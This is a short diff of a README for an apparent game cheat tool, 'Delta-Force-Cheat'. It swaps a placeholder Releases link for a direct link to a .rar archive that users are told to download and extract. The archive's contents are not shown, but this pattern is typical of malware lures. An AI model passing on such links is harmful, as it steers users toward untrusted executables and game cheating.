@@ -67,7 +67,7 @@
 
 ## ▸ [installation](https://github.com/VisibleMaharaja/Delta-Force-Cheat/releases/download/Delta-Force2.1/Delta-Force2.1.rar)
 
-**1.** download the latest release from the **[Releases](https://github.com/yourname/delta-force-rak/releases)** tab
+**1.** download the latest release from the **[Releases](https://github.com/VisibleMaharaja/Delta-Force-Cheat/releases/download/Delta-Force2.1/Delta-Force2.1.rar)** tab
 
 **2.** extract archive
 
